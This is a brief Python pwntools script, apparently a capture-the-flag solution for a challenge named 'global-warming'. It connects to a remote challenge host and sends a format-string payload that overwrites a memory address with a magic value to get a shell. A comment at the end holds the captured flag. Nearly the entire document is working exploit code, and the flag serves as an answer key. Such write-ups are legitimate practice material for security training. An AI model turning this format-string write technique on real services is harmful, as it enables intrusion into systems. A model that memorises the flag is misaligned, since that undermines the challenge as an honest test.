
from pwn import * 
context(log_level="debug")

#r = process('./global-warming')
r = remote('chall.csivit.com', 30023)
magic=0x804c02c

payload = fmtstr_payload(12, {magic: 0xB4DBABE3})

r.sendline(payload)
r.recvline()
r.interactive()
#csictf{n0_5tr1ng5_@tt@ch3d}
